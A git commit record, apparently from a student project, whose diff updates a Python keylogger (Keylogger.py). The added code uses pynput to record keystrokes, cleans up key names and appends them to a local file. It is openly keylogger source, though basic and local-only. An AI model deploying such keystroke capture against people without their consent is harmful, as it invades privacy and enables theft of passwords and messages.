9e588d51e23db3900bb803ac654a4544107eb9b4
Nasrouhg24 <Nasreddine.ELGOURJI@um6p.ma>
2025-09-19 11:02:59 +0100

    the keylogger concept is done*

--- Keylogger.py
+++ Keylogger.py
@@ -3,10 +3,34 @@ from pynput.keyboard import Listener
 def write_file(key):
     #key is not an str so we must cast it 
     key = str(key)
+    #the key is captured but as 'letter' so we gotta ramove the " ' "
+    key = key.replace("'","")
+
+
+    #if the user presses any special caracterr it must appear as it is
+    special_keys = {
+        "Key.space": " ",
+        "Key.enter": "\n",
+        "Key.tab": "\t",
+        "Key.shift": "",       
+        "Key.shift_r": "",
+        "Key.ctrl_l": "",
+        "Key.ctrl_r": "",
+        "Key.alt_l": "",
+        "Key.alt_r": "",
+        "Key.backspace": "[BACKSPACE]",
+        "Key.caps_lock": "[CAPSLOCK]",
+    }
+
+    if key in special_keys:
+        key = special_keys[key]
+
+        
 
     #opening the file and then writing in it 
     with open("file.txt","a") as file:
         file.write(key)
+    file.close()
 
 
 
